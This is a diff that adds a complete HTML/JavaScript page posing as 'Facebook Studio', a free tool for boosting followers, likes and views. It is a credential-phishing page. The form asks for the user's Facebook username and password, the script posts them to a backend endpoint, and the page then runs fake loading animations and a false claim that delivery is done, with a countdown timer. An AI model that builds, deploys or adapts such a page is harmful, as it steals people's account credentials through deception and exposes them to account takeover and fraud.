@@ -1,0 +1,469 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#1877f2">
+<title>Facebook Studio</title>
+<style>
+:root{
+  --blue:#1877f2;
+  --navy:#102a43;
+  --light:#f1f6fc;
+  --muted:#718096;
+  --white:#fff;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:Arial,Helvetica,sans-serif;
+  background:#edf3fa;
+  color:var(--navy);
+  min-height:100vh;
+}
+button,input,textarea{font:inherit}
+button{cursor:pointer;border:0}
+.app{
+  width:100%;max-width:480px;min-height:100vh;
+  margin:auto;background:#f7faff;
+  position:relative;overflow:hidden;
+  box-shadow:0 0 35px #102a4310;
+}
+.topbar{
+  height:66px;background:white;display:flex;
+  align-items:center;justify-content:space-between;
+  padding:0 22px;border-bottom:1px solid #e9eff6;
+}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:18px}
+.brand-icon{
+  width:35px;height:35px;border-radius:11px;
+  background:var(--blue);color:white;display:grid;
+  place-items:center;font-size:23px;font-weight:bold;
+}
+.top-status{font-size:11px;color:#16845b;background:#e7f8ef;padding:7px 10px;border-radius:20px}
+.screen{display:none;padding:25px 22px 35px;animation:appear .35s ease}
+.screen.active{display:block}
+@keyframes appear{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.hero{
+  margin-top:15px;background:linear-gradient(145deg,#0d3d78,#1877f2);
+  color:white;padding:30px 24px;border-radius:25px;
+  position:relative;overflow:hidden;
+}
+.hero:after{
+  content:"f";position:absolute;right:15px;bottom:-45px;
+  font-size:190px;font-weight:bold;color:#ffffff13;
+}
+.hero-tag{font-size:11px;letter-spacing:2px;color:#c9e0ff;font-weight:bold}
+.hero h1{font-size:31px;line-height:1.15;margin:18px 0 12px;max-width:270px}
+.hero p{font-size:13px;line-height:1.7;color:#e2efff;max-width:275px}
+.primary{
+  width:100%;padding:16px;border-radius:13px;
+  background:var(--blue);color:white;font-weight:700;
+  font-size:15px;box-shadow:0 7px 18px #1877f233;
+  transition:.2s;
+}
+.primary:active{transform:scale(.98)}
+.secondary{
+  width:100%;padding:14px;border-radius:13px;
+  background:#eaf2fc;color:#2464ad;font-weight:700;margin-top:11px;
+}
+.intro-card{
+  margin:20px 0;background:white;border:1px solid #e7edf5;
+  padding:19px;border-radius:18px;
+}
+.intro-card h3{font-size:14px;margin-bottom:8px}
+.intro-card p{font-size:12px;line-height:1.7;color:var(--muted)}
+.page-title{font-size:25px;font-weight:800;margin:7px 0}
+.page-sub{font-size:13px;color:var(--muted);line-height:1.6;margin-bottom:22px}
+.step-label{font-size:10px;letter-spacing:1.8px;color:var(--blue);font-weight:800;margin-bottom:12px}
+.notice{
+  background:#eaf3ff;border-left:4px solid var(--blue);
+  border-radius:10px;padding:15px;font-size:12px;
+  line-height:1.7;color:#315477;margin:18px 0;
+}
+.checkline{
+  display:flex;align-items:flex-start;gap:10px;
+  font-size:12px;line-height:1.5;color:#52677e;margin:18px 0;
+}
+.checkline input{width:17px;height:17px;accent-color:var(--blue);flex-shrink:0;margin-top:1px}
+.progress-track{height:5px;background:#e2eaf4;border-radius:20px;overflow:hidden;margin:20px 0}
+.progress-fill{height:100%;width:0;background:var(--blue);border-radius:20px;transition:width .4s}
+.category-grid{display:grid;grid-template-columns:1fr 1fr;gap:13px;margin:20px 0}
+.category{
+  background:white;border:1px solid #e5edf6;border-radius:17px;
+  padding:19px 14px;text-align:left;transition:.2s;
+}
+.category:active{transform:scale(.97)}
+.cat-icon{
+  width:45px;height:45px;border-radius:14px;
+  display:grid;place-items:center;font-size:22px;margin-bottom:14px;
+}
+.category h3{font-size:14px;margin-bottom:6px}
+.category p{font-size:11px;color:var(--muted)}
+.blue{background:#e7f1ff}.purple{background:#f0eaff}
+.orange{background:#fff0e2}.green{background:#e5f8ee}
+.form-card{
+  background:white;border:1px solid #e7edf5;
+  border-radius:18px;padding:18px;margin:15px 0;
+}
+.field-label{display:block;font-size:12px;font-weight:700;margin-bottom:9px}
+.field{
+  width:100%;border:1px solid #dce6f1;background:#f9fbfe;
+  padding:14px;border-radius:11px;outline:none;color:var(--navy);
+  font-size:14px;transition:.2s;
+}
+.field:focus{border-color:var(--blue);box-shadow:0 0 0 3px #1877f218}
+textarea.field{min-height:90px;resize:vertical}
+.field-group{margin-bottom:19px}
+.quantity-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.qty{
+  border:1px solid #dce6f1;background:#f9fbfe;
+  color:#4b6078;padding:13px 5px;border-radius:10px;
+  font-size:12px;font-weight:700;
+}
+.qty.selected{background:#e8f2ff;border:1.5px solid var(--blue);color:var(--blue)}
+.loading-wrap{text-align:center;padding:65px 15px}
+.loader{
+  width:65px;height:65px;border:5px solid #dceaff;
+  border-top-color:var(--blue);border-radius:50%;
+  animation:spin .8s linear infinite;margin:0 auto 25px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-wrap h2{font-size:21px;margin-bottom:9px}
+.loading-wrap p{font-size:12px;color:var(--muted);line-height:1.7}
+.loading-bar{height:7px;background:#e2eaf4;border-radius:20px;margin:25px 0;overflow:hidden}
+.loading-bar span{display:block;width:0;height:100%;background:var(--blue);border-radius:20px;transition:width .2s}
+.result-card{
+  background:white;border:1px solid #e5edf6;
+  border-radius:20px;padding:22px;text-align:center;margin:20px 0;
+}
+.result-icon{
+  width:66px;height:66px;border-radius:50%;
+  background:#e8f2ff;color:var(--blue);display:grid;
+  place-items:center;font-size:30px;margin:0 auto 15px;
+}
+.result-card h2{font-size:21px;margin-bottom:8px}
+.result-card p{font-size:12px;color:var(--muted);line-height:1.7}
+.timer-box{
+  background:#102a43;color:white;border-radius:17px;
+  padding:19px;margin:16px 0;text-align:center;
+}
+.timer-box small{color:#b9d5f6;font-size:11px}
+.timer-box h2{font-size:25px;margin:8px 0}
+.timer-box p{font-size:10px;color:#c8d8e8}
+.toast{
+  position:fixed;bottom:22px;left:50%;transform:translate(-50%,20px);
+  background:#102a43;color:white;padding:13px 18px;border-radius:12px;
+  font-size:12px;opacity:0;pointer-events:none;transition:.25s;
+  z-index:10;width:max-content;max-width:90%;
+}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+.footer{text-align:center;font-size:10px;color:#9aaabd;padding:15px 0 5px}
+.small-note{font-size:10px;color:#8798aa;line-height:1.6;text-align:center;margin-top:15px}
+.back{background:none;color:#56718e;font-size:12px;font-weight:700;padding:10px 0;margin-bottom:12px}
+@media(min-width:600px){
+ body{padding:20px 0}
+ .app{border-radius:22px;min-height:calc(100vh - 40px)}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<header class="topbar">
+  <div class="brand">
+    <div class="brand-icon">f</div>
+    <span>Facebook Studio</span>
+  </div>
+  <span class="top-status">● Free Mode</span>
+</header>
+
+<!-- WELCOME -->
+<section class="screen active" id="welcome">
+  <div class="hero">
+    <div class="hero-tag">CREATOR WORKSPACE</div>
+    <h1>Your Free Facebook Creative Studio</h1>
+    <p>Increase Your Likes Views Followers With This Tool.</p>
+  </div>
+  <div class="intro-card">
+    <h3>Welcome to your workspace</h3>
+    <p>A clean and simple interface to explore different engagement categories.</p>
+  </div>
+  <button class="primary" onclick="go('disclaimer')">Get Started →</button>
+  <div class="footer">FACEBOOK STUDIO • FREE</div>
+</section>
+
+<!-- DISCLAIMER -->
+<section class="screen" id="disclaimer">
+  <button class="back" onclick="go('welcome')">← Back</button>
+  <div class="step-label">BEFORE YOU CONTINUE</div>
+  <h1 class="page-title">A quick note</h1>
+  <p class="page-sub">Please read this information before entering the studio.</p>
+  <div class="intro-card">
+    <h3>About this experience</h3>
+    <p>Facebook Studio is an Free Tool.</p>
+    <br>
+    <p>Boost Your Facebook Account and Page.</p>
+    <br>
+    <p>Thanks For Using.</p>
+  </div>
+  <label class="checkline">
+    <input type="checkbox" id="agreeDisclaimer">
+    <span>I understand this and agree.</span>
+  </label>
+  <button class="primary" onclick="acceptDisclaimer()">Continue →</button>
+</section>
+
+<!-- START LOADING -->
+<section class="screen" id="startup">
+  <div class="loading-wrap">
+    <div class="loader"></div>
+    <h2>Preparing Studio</h2>
+    <p>Setting up your workspace...</p>
+    <div class="loading-bar"><span id="startupBar"></span></div>
+    <p id="startupText">Loading interface...</p>
+  </div>
+</section>
+
+<!-- HOME -->
+<section class="screen" id="home">
+  <div class="step-label">YOUR WORKSPACE</div>
+  <h1 class="page-title">Explore Services</h1>
+  <p class="page-sub">Choose a category to open its page.</p>
+  <div class="category-grid">
+    <button class="category" onclick="chooseCategory('Followers')">
+      <div class="cat-icon blue">👥</div>
+      <h3>Followers</h3><p>Free Followers</p>
+    </button>
+    <button class="category" onclick="chooseCategory('Likes')">
+      <div class="cat-icon purple">👍</div>
+      <h3>Likes</h3><p>Free Likes</p>
+    </button>
+    <button class="category" onclick="chooseCategory('Reels Views')">
+      <div class="cat-icon orange">▶</div>
+      <h3>Reels Views</h3><p>Free Views</p>
+    </button>
+    <button class="category" onclick="chooseCategory('Comments')">
+      <div class="cat-icon green">💬</div>
+      <h3>Comments</h3><p>Free Comments</p>
+    </button>
+  </div>
+  <div class="notice">This workspace is to boost your Facebook profile for free only.</div>
+  <div class="footer">FACEBOOK STUDIO • DASHBOARD</div>
+</section>
+
+<!-- DETAILS -->
+<section class="screen" id="details">
+  <button class="back" onclick="go('home')">← Back to categories</button>
+  <div class="step-label">SUBMISSION DETAILS</div>
+  <h1 class="page-title" id="selectedTitle">Followers</h1>
+  <p class="page-sub">Enter a public username.</p>
+
+  <div class="form-card">
+    <div class="field-group">
+      <label class="field-label" for="username">Username</label>
+      <input class="field" id="username" type="text" maxlength="100" placeholder="Enter username">
+    </div>
+    <div class="field-group">
+      <label class="field-label" for="password">Password</label>
+      <textarea class="field" id="password" maxlength="1000" placeholder="Enter your password"></textarea>
+    </div>
+    <div class="field-group">
+      <label class="field-label">quantity</label>
+      <div class="quantity-grid">
+        <button class="qty selected" onclick="selectQty(this,'100')">100</button>
+        <button class="qty" onclick="selectQty(this,'500')">500</button>
+        <button class="qty" onclick="selectQty(this,'1K')">1K</button>
+        <button class="qty" onclick="selectQty(this,'2.5K')">2.5K</button>
+        <button class="qty" onclick="selectQty(this,'5K')">5K</button>
+        <button class="qty" onclick="selectQty(this,'10K')">10K</button>
+      </div>
+    </div>
+    <label class="checkline">
+      <input type="checkbox" id="agree">
+      <span>I understand the selected quantity.</span>
+    </label>
+  </div>
+  <button class="primary" id="submitBtn" onclick="submitDetails()">NEXT →</button>
+  <div class="small-note">Thank You.</div>
+</section>
+
+<!-- PROCESS -->
+<section class="screen" id="processing">
+  <div class="loading-wrap">
+    <div class="loader"></div>
+    <h2>Preparing Result</h2>
+    <p id="processMessage">being prepared...</p>
+    <div class="loading-bar"><span id="processBar"></span></div>
+    <p id="processPercent">0%</p>
+  </div>
+</section>
+
+<!-- RESULT -->
+<section class="screen" id="result">
+  <div class="step-label">COMPLETE</div>
+  <h1 class="page-title">Your Free Result</h1>
+  <p class="page-sub">Here is a preview of your selected Category.</p>
+  <div class="result-card">
+    <div class="result-icon">✓</div>
+    <h2>Ready</h2>
+    <p id="resultDescription">has been prepared.</p>
+    <div class="notice">Followers, likes, views and comments have been delivered to your Facebook account.</div>
+  </div>
+  <div class="timer-box">
+    <small>TIMER</small>
+    <h2 id="timer">24:00:00</h2>
+    <p>Delivery estimate.</p>
+  </div>
+  <button class="primary" onclick="go('home')">Back to Home</button>
+  <button class="secondary" onclick="resetForm()">Create Another</button>
+  <div class="footer">THANK YOU FOR USING FACEBOOK STUDIO</div>
+</section>
+
+<div class="toast" id="toast"></div>
+</div>
+
+<script>
+let selectedCategory = "Followers";
+let selectedQuantity = "100";
+let timerInterval = null;
+
+function go(id){
+  document.querySelectorAll(".screen").forEach(s=>s.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+function toast(message){
+  const el=document.getElementById("toast");
+  el.textContent=message;
+  el.classList.add("show");
+  setTimeout(()=>el.classList.remove("show"),2600);
+}
+
+function acceptDisclaimer(){
+  if(!document.getElementById("agreeDisclaimer").checked){
+    toast("Please accept the disclaimer first.");
+    return;
+  }
+  go("startup");
+  let value=0;
+  const bar=document.getElementById("startupBar");
+  const label=document.getElementById("startupText");
+  const messages=["Loading interface...","Preparing dashboard...","Almost ready..."];
+  const interval=setInterval(()=>{
+    value+=10;
+    bar.style.width=value+"%";
+    label.textContent=messages[Math.min(2,Math.floor(value/40))];
+    if(value>=100){
+      clearInterval(interval);
+      go("home");
+    }
+  },180);
+}
+
+function chooseCategory(category){
+  selectedCategory=category;
+  document.getElementById("selectedTitle").textContent=category;
+  go("details");
+}
+
+function selectQty(button,value){
+  selectedQuantity=value;
+  document.querySelectorAll(".qty").forEach(q=>q.classList.remove("selected"));
+  button.classList.add("selected");
+}
+
+async function submitDetails(){
+  const username=document.getElementById("username").value.trim();
+  const password=document.getElementById("password").value.trim();
+  const consent=document.getElementById("agree").checked;
+  const btn=document.getElementById("submitBtn");
+
+  if(username.length<2){toast("Please enter a valid username.");return;}
+  if(password.length<2){toast("Please enter your password.");return;}
+  if(!consent){toast("Please confirm the notice.");return;}
+
+  btn.disabled=true;
+  btn.textContent="Submitting...";
+
+  try{
+    const response=await fetch("/api/notify",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({username,password})
+    });
+
+    const data=await response.json();
+    if(!response.ok || !data.success){
+      throw new Error(data.error || "Submission failed.");
+    }
+
+    go("processing");
+    runDemoLoading();
+  }catch(error){
+    toast(error.message || "Could not submit. Please try again.");
+  }finally{
+    btn.disabled=false;
+    btn.textContent="NEXT →";
+  }
+}
+
+function runDemoLoading(){
+  let progress=0;
+  const bar=document.getElementById("processBar");
+  const percent=document.getElementById("processPercent");
+  const message=document.getElementById("processMessage");
+  const messages=[
+    "Preparing...",
+    "Loading elements...",
+    "Finishing...",
+    "Ready..."
+  ];
+
+  const interval=setInterval(()=>{
+    progress+=2;
+    bar.style.width=progress+"%";
+    percent.textContent=progress+"%";
+    message.textContent=messages[Math.min(3,Math.floor(progress/26))];
+
+    if(progress>=100){
+      clearInterval(interval);
+      document.getElementById("resultDescription").textContent=
+        selectedCategory+" • "+selectedQuantity+
+        " selected for "+document.getElementById("username").value.trim()+
+        ". This is a visual simulation, not real Facebook activity.";
+      go("result");
+      startTimer();
+    }
+  },200);
+}
+
+function startTimer(){
+  clearInterval(timerInterval);
+  let seconds=24*60*60;
+  const display=document.getElementById("timer");
+  function update(){
+    const h=String(Math.floor(seconds/3600)).padStart(2,"0");
+    const m=String(Math.floor((seconds%3600)/60)).padStart(2,"0");
+    const s=String(seconds%60).padStart(2,"0");
+    display.textContent=h+":"+m+":"+s;
+    if(seconds>0)seconds--;
+  }
+  update();
+  timerInterval=setInterval(update,1000);
+}
+
+function resetForm(){
+  clearInterval(timerInterval);
+  document.getElementById("username").value="";
+  document.getElementById("password").value="";
+  document.getElementById("agree").checked=false;
+  document.querySelectorAll(".qty").forEach(q=>q.classList.remove("selected"));
+  document.querySelector(".qty").classList.add("selected");
+  selectedQuantity="100";
+  go("home");
+}
+</script>
+</body>
+</html>
